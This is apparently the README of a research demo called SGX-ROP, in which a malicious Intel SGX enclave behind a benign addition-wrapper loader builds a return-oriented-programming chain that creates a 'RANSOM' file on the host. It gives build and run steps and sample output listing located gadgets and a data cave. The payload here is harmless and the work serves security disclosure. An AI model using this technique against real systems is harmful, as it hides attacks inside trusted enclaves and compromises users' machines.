# SGX-ROP Demo

A sample malicious enclave (including a benign loader) which displays a message and creates a file "RANSOM" in the current directory. 

## Requirements

The exploit was successfully tested on an i7-6700K and an i7-8650U on Ubuntu 18.04.1. 

### Hardware
* Intel SGX 
* CPU supporting Intel TSX

### Software
* Intel SGX SDK
* gcc (tested with 7.3)
* make

## Build

To build the enclave and loader, simply run

    make
 
## Run

Either build the enclave (see Build) or use the pre-built binaries in the folder `prebuilt`. 
Run

    ./app
 
to start the loader. 
After calling the trusted function inside the enclave, the enclave looks for an appropriate stack frame to inject the payload, searches for the required ROP gadgets as well as a data caves, and assembles the attack. 
The payload is triggered shortly before the loader program exits (not directly after returning from the enclave call). 
You should see a file "RANSOM" in the current folder altough the loader does not provide any file I/O to the enclave. 

The runtime depends on the randomization applied by ASLR, but should on average be around 20 seconds. 

### Sample Output

A sample output could look like this

```
[INFO ] Wrapper for addition
[INFO ] Adding numbers in enclave
[INFO ] Calling enclave function
[DEBUG] <Start @ 0x7ffffffff000>
[DEBUG] <Saved RSP: 7ffde1aaa5a0>
[DEBUG] <Saved RBP: 7ffde1aaaa80>
[DEBUG] <Searching for stack frame...>
[DEBUG] <Stack frame @ 328: 564bbcd783b1 / 7ffde1aaabe0 (4da3d8d48c689 / 7ffde1aaac00)>
[DEBUG] <Stack frame @ 360: 564bbcd7842f / 7ffde1aaace8 (e80000050a3d8d48 / 7ffde1aacfb4)>
[DEBUG] <RIP @ 0x7ffde1aaabe8>
[DEBUG] <RBP @ 0x7ffde1aaabe0>
[DEBUG] <Searching for gadgets...>
[DEBUG] <Found gadget [SYSCALL] @ 0x7fce6b70f085>
[DEBUG] <Found gadget [POP_RDI] @ 0x7fce6b70e287>
[DEBUG] <Found gadget [POP_RSI] @ 0x7fce6b70d167>
[DEBUG] <Found gadget [LEAVE] @ 0x7fce6b6f79ea>
[DEBUG] <Found gadget [POP_RAX] @ 0x7fce6b29daf4>
[DEBUG] <Found gadget [POP_RDX] @ 0x7fce6b20c6b6>
[DEBUG] <Found gadget [XCHG_RAX_RDI] @ 0x7fce6b1f58e5>
[DEBUG] <Searching for data cave...>
[DEBUG] <Cave @ 0x7fce6b6f1000>
[DEBUG] <Building ROP chain...>
[DEBUG] <Payload ready!>
[INFO ] Successfully returned
[INFO ] 3 + 5 = 8
[INFO ] Done adding
[INFO ] Wrapper end

    Hello from the malicious enclave! There should now be a file 'RANSOM'.

[INFO ] Enter a character before exit ...

[INFO ] Application exited normally
./app  6.97s user 0.04s system 85% cpu 8.226 total
```
